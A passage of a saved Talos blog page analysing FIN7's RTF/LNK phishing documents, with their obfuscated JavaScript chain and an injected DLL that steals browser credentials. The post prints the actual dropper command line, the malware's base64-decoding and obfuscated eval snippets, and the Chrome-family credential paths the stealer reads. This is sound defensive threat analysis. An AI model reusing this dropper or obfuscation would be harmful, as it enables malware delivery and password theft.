+                                <path class="podcast-fill" d="M21.8,15.1c0-7.8,6.3-14.1,14.1-14.1c7.8,0,14.1,6.3,14.1,14.1v25.4c0,7.8-6.3,14.1-14.1,14.1  c-7.8,0-14.1-6.3-14.1-14.1V15.1z M59.9,40.1c0,12.4-9.4,22.6-21.5,23.9v3.6h12.8c1.4,0,2.6,1.2,2.6,2.6c0,1.4-1.2,2.6-2.6,2.6H20.4  c-1.4,0-2.6-1.2-2.6-2.6c0-1.4,1.2-2.6,2.6-2.6h12.8V64c-12-1.3-21.5-11.5-21.5-23.9v-6.8c0-1.4,1.2-2.6,2.6-2.6  c1.4,0,2.6,1.2,2.6,2.6v6.8c0,10.4,8.5,18.8,18.8,18.8c10.4,0,18.8-8.5,18.8-18.9v-6.8c0-1.4,1.2-2.6,2.6-2.6c1.4,0,2.6,1.2,2.6,2.6  V40.1z"></path>
+                            </svg>
+
+                            <span>
+                                Podcasts
+                            </span>
+                        </a>
+                    </div>
+                    <input class="sub-nav-trigger" id="podcast-sub-trigger" type="checkbox">
+                    <label class="sub-nav-trigger-label" for="podcast-sub-trigger">
+                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="48.167px" height="47.75px" viewBox="0 0 48.167 47.75">
+                            <circle opacity="0.4" fill="none" stroke="#FFFFFF" stroke-miterlimit="10" cx="24.083" cy="23.875" r="22"></circle>
+                            <g>
+                                <circle fill="#FFFFFF" cx="24.083" cy="16.068" r="2.496"></circle>
+                                <circle fill="#FFFFFF" cx="24.083" cy="23.875" r="2.496"></circle>
+                                <circle fill="#FFFFFF" cx="24.083" cy="31.682" r="2.496"></circle>
+                            </g>
+                        </svg>
+                    </label>
+                    <ul class="sub-nav">
+                        <li class="desktop-hide">
+                            <a href="https://talosintelligence.com/podcasts">
+                                <h4>Podcasts</h4>
+                            </a>
+                        </li>
+                        <li class="desktop-hide">
+                            <label class="subnav-back-button" for="podcast-sub-trigger">BACK</label>
+                        </li>
+                        <li><a href="https://talosintelligence.com/podcasts/shows/beers_with_talos">Beers with Talos</a></li>
+                        <li><a href="https://talosintelligence.com/podcasts/shows/talos_takes">Talos Takes</a></li>
+                    </ul>
+                    <div class="desktop-hide subnav-overlay">
+                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="podcast-icon-nav" x="0px" y="0px" viewBox="0 0 71.8 75" width="26px" height="20px" style="enable-background:new 0 0 71.8 75;" xml:space="preserve">
+                            <style type="text/css">
+                                .podcast-fill{fill:#fff;}
+                            </style>
+                            <path class="podcast-fill" d="M21.8,15.1c0-7.8,6.3-14.1,14.1-14.1c7.8,0,14.1,6.3,14.1,14.1v25.4c0,7.8-6.3,14.1-14.1,14.1  c-7.8,0-14.1-6.3-14.1-14.1V15.1z M59.9,40.1c0,12.4-9.4,22.6-21.5,23.9v3.6h12.8c1.4,0,2.6,1.2,2.6,2.6c0,1.4-1.2,2.6-2.6,2.6H20.4  c-1.4,0-2.6-1.2-2.6-2.6c0-1.4,1.2-2.6,2.6-2.6h12.8V64c-12-1.3-21.5-11.5-21.5-23.9v-6.8c0-1.4,1.2-2.6,2.6-2.6  c1.4,0,2.6,1.2,2.6,2.6v6.8c0,10.4,8.5,18.8,18.8,18.8c10.4,0,18.8-8.5,18.8-18.9v-6.8c0-1.4,1.2-2.6,2.6-2.6c1.4,0,2.6,1.2,2.6,2.6  V40.1z"></path>
+                        </svg>
+                    </div>
+                </li>
+
+                <li class="nav-item">
+                    <a class="primary_nav_link" href="https://talosintelligence.com/about">
+                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="55px" height="55px" viewBox="0 0 55 55">
+                            <g>
+                                <g class="mobile-nav-home">
+                                    <path fill-rule="evenodd" clip-rule="evenodd" fill="#FFFFFF" d="M45.201,12.343c0.378,0.48,0.758,0.925,1.096,1.401    c2.975,4.207,4.543,8.876,4.494,14.044c-0.05,5.452-1.643,10.386-5.186,14.593c-3.484,4.133-7.929,6.73-13.182,7.895    c-6.313,1.398-12.216,0.275-17.695-3.131c-0.441-0.273-0.847-0.6-1.266-0.904c-0.11-0.078-0.208-0.174-0.337-0.287    c0.127-0.141,0.246-0.27,0.366-0.398c0.887-0.949,1.765-1.904,2.663-2.844c0.114-0.119,0.321-0.217,0.485-0.217    c3.658-0.006,7.318,0,10.975,0.008c3.458,0.006,6.913,0.02,10.369,0.02c0.957,0,1.871-0.193,2.62-0.844    c0.797-0.693,1.157-1.596,1.157-2.643c0.001-7.533,0.003-15.067-0.005-22.601c-0.002-0.309,0.088-0.524,0.3-0.743    C43.098,14.598,44.127,13.49,45.201,12.343"></path>
+                                    <path fill-rule="evenodd" clip-rule="evenodd" fill="#FFFFFF" d="M41.402,8.822c-0.99,1.027-1.994,2.021-2.935,3.072    c-0.312,0.35-0.616,0.416-1.036,0.415c-6.98-0.009-13.957-0.007-20.938-0.007c-2.039,0-3.561,1.514-3.561,3.557    c0,6.504,0.002,13.008,0.006,19.512c0.002,0.973,0.011,1.943,0.004,2.914c0,0.133-0.04,0.301-0.127,0.393    c-1.069,1.162-2.15,2.314-3.229,3.469c-0.021,0.023-0.052,0.039-0.109,0.08c-0.159-0.188-0.323-0.369-0.471-0.562    c-2.535-3.348-4.119-7.102-4.605-11.268c-0.61-5.229,0.194-10.229,2.835-14.839c2.669-4.664,6.655-7.805,11.618-9.75    c3.205-1.257,6.533-1.852,9.977-1.621c4.478,0.298,8.553,1.754,12.227,4.325c0.101,0.072,0.197,0.151,0.291,0.229    C41.364,8.755,41.374,8.778,41.402,8.822"></path>
+                                    <path fill-rule="evenodd" clip-rule="evenodd" fill="#FFFFFF" d="M39.799,12.47c0.873-0.911,1.749-1.829,2.676-2.797    c0.605,0.564,1.195,1.112,1.816,1.691c-0.941,0.985-1.817,1.903-2.703,2.83c-0.276-0.339-0.511-0.688-0.807-0.975    C40.492,12.941,40.145,12.728,39.799,12.47"></path>
+                                    <path fill-rule="evenodd" clip-rule="evenodd" fill="#FFFFFF" d="M10.35,43.279c0.969-1.016,1.885-1.977,2.76-2.893    c0.213,0.369,0.376,0.762,0.639,1.072c0.265,0.312,0.627,0.539,0.98,0.832c-0.853,0.891-1.713,1.791-2.624,2.746    C11.513,44.445,10.939,43.869,10.35,43.279"></path>
+                                </g>
+                            </g>
+                        </svg>
+                        <span>About</span>
+                    </a>
+                </li>
+                <li class="nav-item desktop-hide">
+                    <button class="search-button" data-ghost-search=""><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg> <span>Search Blog</span></button>
+                </li>
+            </ul>
+        </div>
+        <div class="nav-search-wrapper">
+            <button class="search-button" data-ghost-search=""><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
+        </div>
+    </div>
+</nav>
+    
+
+    <main id="site-main">
+        <div class="container-fluid">
+            <div class="row main-content-row">
+                <div class="col post-full-content">
+                    
+<article class="post tag-threats tag-hash-blogger ">
+        <div class="feature-image-wrapper my-5">
+            <figure>
+                <img src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/image17.png" alt="" class="img-fluid">
+            </figure>
+        </div>
+
+    <h1 class="text-center">FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks</h1>
+
+    <div class="text-center m-1">
+        <div class="post-author">
+            <span>By </span>
+                <a href="https://blog.talosintelligence.com/author/edmund-brumaghin/">Edmund Brumaghin</a>
+        </div>
+
+        <br>
+        <time class="post-datetime" datetime="September 27, 2017 13:38">
+            Wednesday, September 27, 2017 13:38
+        </time>
+
+        <div class="m-3">
+                            <a href="https://blog.talosintelligence.com/category/threats/" class="category primary-category">
+                                Threats
+                            </a>
+                                </div>
+    </div>
+
+    <section class="post-content-wrapper mt-5">
+        <div class="post-content">
+            <p><i>This post was authored by <a href="https://twitter.com/smgoreli">Michael Gorelik</a> and <a href="https://twitter.com/jershmagersh">Josh Reynolds</a></i><br></p><h2 id="executive-summary-throughout-this-blog-post-we-will-be-detailing-a-newly-discovered-rtf-document-family-that-is-being-leveraged-by-the-fin7-group-also-known-as-the-carbanak-gang-which-is-a-financially-motivated-group-targeting-the-financial-hospitality-and-medical-industries-this-document-is-used-in-phishing-campaigns-to-execute-a-series-of-scripting-languages-containing-multiple-obfuscation-mechanisms-and-advanced-techniques-to-bypass-traditional-security-mechanisms-the-document-contains-messages-enticing-the-user-to-click-on-an-embedded-object-that-executes-scripts-which-are-used-to-infect-the-system-with-an-information-stealing-malware-variant-this-malware-is-then-used-to-steal-passwords-from-popular-browsers-and-mail-clients-which-are-sent-to-remote-nodes-that-are-accessible-to-the-attackers-these-advanced-mechanisms-and-the-information-stealing-malware-will-be-discussed-in-detail-we-will-also-review-a-number-of-static-and-dynamic-detection-mechanisms-used-in-the-amp-for-endpoints-and-threat-grid-product-lines-to-detect-these-document-families-">Executive Summary Throughout this blog post we will be detailing a newly discovered RTF document family that is being leveraged by the FIN7 group (also known as the Carbanak gang) which is a financially-motivated group targeting the financial, hospitality, and medical industries. This document is used in phishing campaigns to execute a series of scripting languages containing multiple obfuscation mechanisms and advanced techniques to bypass traditional security mechanisms. The document contains messages enticing the user to click on an embedded object that executes scripts which are used to infect the system with an information stealing malware variant. This malware is then used to steal passwords from popular browsers and mail clients which are sent to remote nodes that are accessible to the attackers. These advanced mechanisms and the information stealing malware will be discussed in detail. We will also review a number of static and dynamic detection mechanisms used in the AMP for Endpoints and Threat Grid product lines to detect these document families.<br> <br></h2><h2 id="introduction-on-june-9th-2017-morphisec-labpublished-a-blog-post-detailing-a-new-infection-vector-technique-using-an-rtf-document-containing-an-embedded-javascript-ole-object-when-clicked-it-launches-an-infection-chain-made-up-of-javascript-and-a-final-shellcode-payload-that-makes-use-of-dns-to-load-additional-shellcode-from-a-remote-command-and-control-server-in-this-collaboration-post-with-morphisec-lab-and-cisco-s-research-and-efficacy-team-we-are-now-publishing-details-of-this-new-document-variant-that-makes-use-of-an-lnk-embedded-ole-object-which-extracts-a-javascript-bot-from-a-document-object-and-injects-a-stealer-dll-in-memory-using-powershell-the-details-we-are-releasing-are-to-provide-insight-into-attack-methodologies-being-employed-by-sophisticated-groups-such-as-fin7-who-are-consistently-changing-techniques-between-attacks-to-avoid-detection-and-to-demonstrate-the-detection-capabilities-of-the-amp-for-endpoints-and-threat-grid-product-lines-this-is-relevant-to-the-constantly-changing-threats-that-are-affecting-multiple-types-of-industries-on-a-daily-basis-">Introduction On June 9th, 2017 Morphisec Lab<a href="http://blog.morphisec.com/fin7-attacks-restaurant-industry">published a blog post</a> detailing a new infection vector technique using an RTF document containing an embedded JavaScript OLE object. When clicked it launches an infection chain made up of JavaScript, and a final shellcode payload that makes use of DNS to load additional shellcode from a remote command and control server. In this collaboration post with Morphisec Lab and Cisco's Research and Efficacy Team, we are now publishing details of this new document variant that makes use of an LNK embedded OLE object, which extracts a JavaScript bot from a document object, and injects a stealer DLL in memory using PowerShell. The details we are releasing are to provide insight into attack methodologies being employed by sophisticated groups such as FIN7 who are consistently changing techniques between attacks to avoid detection, and to demonstrate the detection capabilities of the AMP for Endpoints and Threat Grid product lines. This is relevant to the constantly changing threats that are affecting multiple types of industries on a daily basis.<br></h2><h2 id="infection-vector-the-dropper-variant-that-we-encountered-makes-use-of-an-lnk-file-to-execute-wscript-exe-with-the-beginning-of-the-javascript-chain-from-a-word-document-object-">Infection Vector The dropper variant that we encountered makes use of an LNK file to execute wscript.exe with the beginning of the JavaScript chain from a word document object:<br></h2><pre><code>C:\Windows\System32\cmd.exe..\..\..\Windows\System32\cmd.exe /C set x=wsc@ript /e:js@cript %HOMEPATH%\md5.txt &amp; echo try{w=GetObject("","Wor"+"d.Application");this[String.fromCharCode(101)+'va'+'l'](w.ActiveDocument.Shapes(1).TextFrame.TextRange.Text);}catch(e){}; &gt;%HOMEPATH%\md5.txt &amp; echo %x:@=%|cmd
+</code></pre><p>This chain involves a substantial amount of base64 encoded JavaScript files that make up each component of the JavaScript bot. It also contains the reflective DLL injection PowerShell code to inject an information stealing malware variant DLL which will be discussed further.</p><h2 id="javascript-comparisons">JavaScript Comparisons</h2><h3 id="clustering-decoded-javascript-functionality-a-single-one-of-these-documents-can-produce-as-many-as-40-javascript-files-in-order-to-identify-similar-techniques-we-decided-to-use-entropy-of-a-given-javascript-file-and-the-base64-decoding-depth-to-cluster-files-within-a-scatter-plot-with-theggplot-andggiraph-r-libraries-">Clustering Decoded JavaScript Functionality &nbsp;A single one of these documents can produce as many as 40 JavaScript files. In order to identify similar techniques, we decided to use entropy of a given JavaScript file, and the base64 decoding depth to cluster files within a scatter plot with the<a href="http://ggplot2.org/">ggplot</a> and<a href="https://davidgohel.github.io/ggiraph/index.html">ggiraph</a> R libraries.</h3><p>Before we demonstrate our analysis results, we will explain the values used for plotting and clustering of the JavaScript files.</p><h3 id="base64-encodings-the-majority-of-the-javascript-obfuscation-is-nested-base64-encodings-base64-is-a-binary-to-text-encoding-scheme-which-can-be-used-to-represent-any-type-of-data-in-the-case-of-these-documents-it-is-used-to-encode-javascript-functionality-multiple-times-likely-in-order-to-avoid-common-analysis-techniques-employed-by-traditional-anti-virus-software-which-only-emulate-javascript-instructions-for-a-limited-amount-of-iterations-the-base64-blobs-are-hardcoded-or-comma-separated-which-are-then-concatenated-and-decoded-making-up-the-next-javascript-code-to-be-executed-it-is-decoded-using-an-cdo-message-activexobject-invocation-and-specifying-the-contenttransferencoding-to-be-base64-note-that-the-windows-1251-charset-is-cyrillic-which-may-indicate-russian-origin-">Base64 Encodings The majority of the JavaScript obfuscation is nested base64 encodings. Base64 is a binary to text encoding scheme which can be used to represent any type of data. In the case of these documents it is used to encode JavaScript functionality multiple times, likely in order to avoid common analysis techniques employed by traditional anti-virus software which only emulate JavaScript instructions for a limited amount of iterations. The base64 blobs are hardcoded, or comma separated, which are then concatenated and decoded making up the next JavaScript code to be executed. It is decoded using an CDO.Message ActiveXObject invocation and specifying the ContentTransferEncoding to be base64 (note that the windows-1251 charset is Cyrillic, which may indicate Russian origin):<br></h3><pre><code>function b64dec(data){
+
+&nbsp;&nbsp;&nbsp; var cdo = new ActiveXObject("CDO.Message");
+&nbsp;&nbsp;&nbsp; var bp = cdo.BodyPart;
+&nbsp;&nbsp;&nbsp; bp.ContentTransferEncoding = "base64";
+&nbsp;&nbsp;&nbsp; bp.Charset = "windows-1251";
+&nbsp;&nbsp;&nbsp; var st = bp.GetEncodedContentStream();
+&nbsp;&nbsp;&nbsp; st.WriteText(data);
+&nbsp;&nbsp;&nbsp; st.Flush();
+&nbsp;&nbsp;&nbsp; st = bp.GetDecodedContentStream();
+&nbsp;&nbsp;&nbsp; st.Charset = "utf-8";
+&nbsp;&nbsp;&nbsp; return st.ReadText;
+}</code></pre><p>This is then evaluated using an obfuscated function invocation, E.G:<br></p><pre><code>MyName.getGlct()[String.fromCharCode(101)+'va'+'l'](b64dec(energy));</code></pre><p>These base64 decoding steps lead to various execution branches of JavaScript bot functionality, and the injection of a stealer DLL into memory:</p><figure class="kg-card kg-image-card"><img src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/image17(1).png" class="kg-image" alt="" loading="lazy"></figure><p><b>Figure 1: Detailed Document Infection Chain Using JavaScript and DLL Injection</b><br></p><h3 id="javascript-entropy-entropy-involves-the-calculation-of-disorder-and-uncertainty-within-a-given-amount-of-data-in-this-case-we-are-interested-in-associating-extracted-javascript-files-based-on-this-calculation-since-variations-of-these-documents-contain-similar-functionality-but-employed-obfuscation-mechanisms-makes-clustering-them-difficult-we-used-the-following-calculation-fromero-carrera-s-blog-in-python-">JavaScript Entropy Entropy involves the calculation of disorder and uncertainty within a given amount of data. In this case, we are interested in associating extracted JavaScript files based on this calculation, since variations of these documents contain similar functionality, but employed obfuscation mechanisms makes clustering them difficult. We used the following calculation from<a href="http://blog.dkbza.org/2007/05/scanning-data-for-entropy-anomalies.html">Ero Carrera's blog</a> in Python:<br></h3><pre><code>import math 
+
+def H(data): 
+&nbsp;&nbsp;&nbsp; if not data: 
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 0&nbsp;
+    entropy = 0&nbsp;
+    for x in range(256):&nbsp;
+        p_x = float(data.count(chr(x)))/len(data) 
+        if p_x &gt; 0: 
+           entropy += - p_x*math.log(p_x, 2) 
+    return entropy</code></pre><p>This calculation is done for each JavaScript file and is the X axis of our scatter plots that will be described in the next section.<br></p><h3 id="scatter-plot-for-clustering-javascript-functionality-we-began-with-an-initial-set-of-documents-which-did-not-contain-a-dropper-dll-we-then-calculated-the-amount-of-base64-decoding-required-to-produce-each-file-y-axis-and-calculated-their-respective-entropy-x-axis-we-then-reviewed-each-scatter-plot-grouping-and-labeled-their-respective-functionality-in-red-">Scatter Plot for Clustering &amp; JavaScript Functionality We began with an initial set of documents which did not contain a dropper DLL. We then calculated the amount of base64 decoding required to produce each file (Y axis) and calculated their respective entropy (X axis). We then reviewed each scatter plot grouping and labeled their respective functionality in red:</h3><figure class="kg-card kg-image-card"><img src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/image20.png" class="kg-image" alt="" loading="lazy"></figure><p><b>Figure 2: Scatter plot using entropy and base64 decoding depth</b></p><p>There are a number of conclusions from the scatter plot:</p><ol><li>The higher depth of base64 decoding shows more interesting functionality (to be expected)</li><li>The bot functionality and C2 contact JavaScript is within multiple sets of files at close decoding depths and entropy</li><li>The task scheduling functionality vary in depth and entropy (two separate cases) We then applied the same technique to the second generation of documents which ship an entire base64 encoded and compressed DLL:</li></ol><figure class="kg-card kg-image-card"><img src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/image12.png" class="kg-image" alt="" loading="lazy"></figure><p><b>Figure 3: Scatter plot of PowerShell DLL documents</b></p><p>The outliers are the decoded DLLs and XML task files. When these components are removed from the scatter plot (leaving only JavaScript) we see similar clusters to the first generation of documents:</p><figure class="kg-card kg-image-card"><img src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/image15.png" class="kg-image" alt="" loading="lazy"></figure><p><b>Figure 4: Modified Plot of PowerShell DLL Documents</b></p><p>Based on the number of clusters and range of entropy we see that this generation of documents contain more files with varying functionality and depth. This plotting technique also provides a method of identifying new functionality by showing outliers, such as the labeled PS Outlier which contains an array of encoded PowerShell bytes rather than a blob that provides the final PowerShell for DLL injection:</p><figure class="kg-card kg-image-card"><img src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/image9.png" class="kg-image" alt="" loading="lazy"></figure><p><b>Figure 5: Identified New PowerShell Functionality Due to Entropy Outlier</b><br></p><h3 id="javascript-obfuscation-changes-once-similar-functionality-has-been-clustered-the-changes-made-between-generated-documents-become-apparent-variable-names-and-guid-paths-are-changed-">JavaScript Obfuscation Changes Once similar functionality has been clustered, the changes made between generated documents become apparent. Variable names and GUID paths are changed:</h3><figure class="kg-card kg-image-card"><img src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/image3.png" class="kg-image" alt="" loading="lazy"></figure><p><b>Figure 6: Variables and Path GUID JS Changes</b></p><p>This functionality also highlights an interesting obfuscation mechanism that some emulation engines may ignore. The function body of the evaluated JavaScript appears to be within a multi-line comment, however, in reality this is evaluated as a multi-line string. This can be seen below when tested in Chrome's scripting console:</p><figure class="kg-card kg-image-card"><img src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/image18.png" class="kg-image" alt="" loading="lazy"></figure><p><b>Figure 7: JavaScript Multi-Line Comment String Obfuscation</b></p><p>Functions are re-ordered:</p><figure class="kg-card kg-image-card"><img src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/image16.png" class="kg-image" alt="" loading="lazy"></figure><p><b>Figure 8: Reordered Function Example</b></p><p>Command and Control addresses are changed:</p><figure class="kg-card kg-image-card"><img src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/image25.png" class="kg-image" alt="" loading="lazy"></figure><p><b>Figure 9: Changed Command and Control Addresses</b></p><p>Varying base64 encoding depths, which can be identified using our scatter plot, such as the PowerShell write and execution functionality:</p><figure class="kg-card kg-image-card"><img src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/image14.png" class="kg-image" alt="" loading="lazy"></figure><p><b>Figure 10: PowerShell Write and Execute Functionality at Different Base64 Decoding Depths</b></p><p>Which when compared vary in decoding depth but are the same functionality:</p><figure class="kg-card kg-image-card"><img src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/image27.png" class="kg-image" alt="" loading="lazy"></figure><p><b>Figure 11: Code Comparison PowerShell Write and Execute Functionality</b><br></p><h2 id="stealer-dll">Stealer DLL</h2><h3 id="recovering-the-dll-one-of-the-final-components-of-these-javascript-decoding-chains-is-a-powershell-reflective-dll-injection-script-which-contains-copy-pasted-functions-frompowersploit-s-invoke-reflectivepeinjection-the-dll-is-de-obfuscated-by-decoding-the-base64-blob-and-uses-io-compression-deflatestream-to-decompress-the-resulting-bytes-in-order-to-recover-the-dll-we-can-simply-write-the-decompressed-bytes-to-disk-using-io-file-writeallbytes-">Recovering the DLL &nbsp;One of the final components of these JavaScript 'decoding chains' is a PowerShell reflective DLL injection script which contains copy pasted functions from<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1">Powersploit's Invoke-ReflectivePEInjection</a>. The DLL is de-obfuscated by decoding the base64 blob and uses IO.Compression.DeflateStream to decompress the resulting bytes. In order to recover the DLL we can simply write the decompressed bytes to disk using [io.file]::WriteAllBytes.</h3><figure class="kg-card kg-image-card"><img src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/image7.png" class="kg-image" alt="" loading="lazy"></figure><p><b>Figure 12: PowerShell stream decompression and writing DLL to disk</b></p><figure class="kg-card kg-image-card"><img src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/image10.png" class="kg-image" alt="" loading="lazy"></figure><p><b>Figure 13: Copy-Pasted PowerSploit Invoke-ReflectivePEInjection Code</b><br></p><h3 id="stealer-dll-functionality-we-wrote-a-blog-post-about-the-h1n1-dropper-in-august-2016-whichreferenced-a-string-de-obfuscation-script-to-handle-multiple-32-bit-value-xor-add-and-sub-string-obfuscation-techniques-this-script-is-able-to-handle-similar-functionality-in-this-stealer-dll-">Stealer DLL Functionality We wrote a blog post about the H1N1 dropper in August 2016, which<a href="https://communities.cisco.com/docs/DOC-69444">referenced a string de-obfuscation script</a> to handle multiple 32-bit value XOR, ADD, and SUB string obfuscation techniques. This script is able to handle similar functionality in this stealer DLL:</h3><figure class="kg-card kg-image-card"><img src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/image19.png" class="kg-image" alt="" loading="lazy"></figure><p><b>Figure 14: Firefox String Decoding</b></p><p>Import hashing functionality involves resolving the export table for a given DLL (common for packers/malware):</p><figure class="kg-card kg-image-card"><img src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/image5.png" class="kg-image" alt="" loading="lazy"></figure><p><b>Figure 15: PowerShell Injected DLL Hashing Functionality PE Offsets</b></p><p>Then using XOR and ROL algorithm over given export values to compare against given hashes for exports to resolve:</p><figure class="kg-card kg-image-card"><img src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/image26.png" class="kg-image" alt="" loading="lazy"></figure><p><b>Figure 16: PowerShell Injected DLL Hashing Algorithm</b></p><p>This DLL also contains similar stealer functionality, E.G the decryption of Intelliform data using CryptUnprotectData by hashing cached URLs:</p><figure class="kg-card kg-image-card"><img src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/image6.png" class="kg-image" alt="" loading="lazy"></figure><p><b>Figure 17: PowerShell Injected DLL Intelliform Data Stealing</b></p><p>This binary also contains Outlook and Firefox stealer functionality and the ability to steal login information from Google Chrome, Chromium, forks of Chromium and Opera browsers that will be discussed in the next section.</p><h3 id="chrome-chromium-and-opera-credential-stealing-the-chrome-chromium-chromium-forks-and-opera-credential-stealing-functionality-opens-the-database-path-login-data-sqlite3-database-reads-the-url-username-and-password-fields-and-calls-cryptunprotectdata-to-decrypt-user-passwords-the-following-paths-are-checked-for-this-database-under-appdata-programdata-and-localappdata-">Chrome, Chromium and Opera Credential Stealing &nbsp;The Chrome, Chromium, Chromium forks and Opera credential stealing functionality opens the [Database Path]\Login Data sqlite3 database, reads the URL, username, and password fields, and calls CryptUnprotectData to decrypt user passwords. The following paths are checked for this database under %APPDATA%, %PROGRAMDATA%, and %LOCALAPPDATA%:<br></h3><ul><li>\Google\Chrome\User Data\Default\Login Data</li><li>\Chromium\User Data\Default\Login Data</li><li>\MapleStudio\ChromePlus\User Data\Default\Login Data</li><li>\YandexBrowse\User Data\Default\Login Data</li><li>\Nichrom\User Data\Default\Login Data</li><li>\Comodo\Dragon\User Data\Default\Login Data Although Opera is not a fork of Chromium, the newest version has credentials with the same implementation under the path: \Opera Software\Opera Stable\Login Data<br></li></ul><h3 id="stolen-data-command-and-control-in-addition-to-the-javascript-bot-functionality-the-stolen-data-is-dumped-to-appdata-username-ini-and-sets-the-file-creation-time-to-be-that-of-ntdll-dll-this-data-is-read-and-encrypted-using-the-simpleencrypt-function-which-as-their-name-implies-is-a-simple-substitution-cipher-">Stolen Data Command and Control &nbsp;In addition to the JavaScript bot functionality, the stolen data is dumped to %APPDATA%\%USERNAME%.ini and sets the file creation time to be that of ntdll.dll. This data is read and encrypted using the SimpleEncrypt function, which as their name implies, is a simple substitution cipher:</h3><figure class="kg-card kg-image-card"><img src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/ex18.png" class="kg-image" alt="" loading="lazy"></figure><p><b>Figure 18: Command and Control Data Substitution Cipher</b></p><p>This is then POSTed to a hardcoded command and control addresses, including the Google Apps Script hosting service (also notice the alfIn variable declaration which is the alphabet used for the substitution cipher):</p><figure class="kg-card kg-image-card"><img src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/image2.png" class="kg-image" alt="" loading="lazy"></figure><p><b>Figure 19: Command and Control Data Exfiltration JavaScript Functionality</b></p><p>This is again using the comment block evasion technique.</p><h2 id="amp-coverage-the-amp-for-endpoints-and-threat-grid-product-lines-are-ideal-for-dealing-with-this-threat-as-they-can-use-both-static-and-dynamic-activity-to-detect-malicious-activity-">AMP Coverage &nbsp;The AMP for Endpoints and Threat Grid product lines are ideal for dealing with this threat, as they can use both static and dynamic activity to detect malicious activity.<br></h2><h3 id="amp-threat-grid-without-clicking-on-the-embedded-ole-object-within-the-document-threat-grid-can-provide-insight-into-possible-malicious-activity-using-static-attributes-alone-embedded-functionality-is-automatically-extracted-by-threat-grid-in-this-instance-the-embedded-lnk-ole-object-contains-seemingly-malicious-commands-that-are-executed-when-clicked-">AMP Threat Grid Without clicking on the embedded OLE object within the document Threat Grid can provide insight into possible malicious activity using static attributes alone. Embedded functionality is automatically extracted by Threat Grid, in this instance the embedded LNK OLE object contains seemingly malicious commands that are executed when clicked:</h3><figure class="kg-card kg-image-card"><img src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/image23.png" class="kg-image" alt="" loading="lazy"></figure><p><b>Figure 20: Document LNK Command Prompt Static Attributes</b></p><figure class="kg-card kg-image-card"><img src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/image4.png" class="kg-image" alt="" loading="lazy"></figure><p><b>Figure 21: Active Document LNK Static Attributes</b></p><p>The OLE object can be clicked on within the document during the Threat Grid run using the Open Embedded Object in Word Document playbook, which will automatically execute the embedded object during the Threat Grid run when selected from the submission dropdown menu:</p><figure class="kg-card kg-image-card"><img src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/image22.png" class="kg-image" alt="" loading="lazy"></figure><p><b>Figure 22: Selecting Playbook from Submission Menu</b></p><p>A depiction of this automated user interaction can be seen below:</p><figure class="kg-card kg-image-card"><img src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/playbook-FIN7-click.gif" class="kg-image" alt="" loading="lazy"></figure><p><b>Figure 23: Clicking on Document OLE Object Through Playbook</b></p><p>When clicked additional behavioral indicators are triggered based on dynamic behavior:</p><figure class="kg-card kg-image-card"><img src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/image21.png" class="kg-image" alt="" loading="lazy"></figure><p><b>Figure 24: Dynamic Activity Caused by Clicking the OLE Object</b></p><p>Task creations (used by the JavaScript bot for periodic execution of components) can also be observed:</p><figure class="kg-card kg-image-card"><img src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/image1.png" class="kg-image" alt="" loading="lazy"></figure><p><b>Figure 25: Task Creation Dynamic Activit</b>y</p><p>The JavaScript content that is periodically executed can be seen the Artifacts section and can be downloaded or resubmitted for further analysis:</p><figure class="kg-card kg-image-card"><img src="./FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks_files/image13.png" class="kg-image" alt="" loading="lazy"></figure><p><b>Figure 26: Written JavaScript Artifact Objects</b></p><p>This intelligence is then integrated back into the AMP cloud protecting all customers who may be targeted by similar attack methodologies.</p><h3 